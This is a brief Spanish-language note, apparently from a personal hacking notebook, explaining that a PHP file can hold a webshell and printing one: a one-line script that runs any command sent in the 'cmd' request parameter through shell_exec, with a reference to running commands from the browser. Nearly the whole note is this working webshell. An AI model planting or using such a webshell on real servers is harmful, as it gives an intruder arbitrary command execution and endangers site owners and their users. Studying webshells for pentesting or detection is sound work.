Podemos tener dentro de nuestro php una webshell:
```php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Y desde el navegador ejecutaríamos comandos de la siguiente forma:
![[Pasted image 20231216164302.png]]
